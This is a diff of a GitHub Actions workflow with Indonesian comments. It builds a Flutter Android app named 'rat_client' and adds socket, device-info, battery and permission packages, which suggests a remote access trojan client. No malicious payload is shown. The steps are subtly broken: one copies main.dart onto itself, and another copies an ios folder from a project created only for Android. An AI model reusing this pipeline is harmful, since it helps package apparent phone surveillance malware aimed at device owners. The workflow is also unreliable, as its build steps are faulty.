@@ -23,24 +23,23 @@ jobs:
         with:
           flutter-version: '3.19.0'
 
-      # 1. Buat project Android
-      - name: Initialize Project
-        run: flutter create --platforms=android --org com.example --project-name rat_client .
-
-      # 2. SUNTIKKAN V2 KE FOLDER ANDROID (Supaya battery_plus tidak error)
-      - name: Fix Android Embedding
+      # 1. Download kerangka project Flutter yang sudah V2
+      - name: Download Flutter Template
         run: |
-          echo "flutterEmbedding=2" >> android/local.properties
-          
-      # 3. Timpa main.dart kamu
+          cd /tmp
+          flutter create --platforms=android --org com.example rat_client
+          cp -r /tmp/rat_client/android ./android
+          cp -r /tmp/rat_client/ios ./ios
+
+      # 2. Timpa main.dart kamu
       - name: Overwrite Main Dart
         run: cp lib/main.dart lib/main.dart
 
-      # 4. Tambahkan dependencies
+      # 3. Tambah dependencies
       - name: Add Dependencies
         run: flutter pub add socket_io_client device_info_plus battery_plus permission_handler
 
-      # 5. Build
+      # 4. Build APK
       - name: Build APK
         run: flutter build apk --release
 
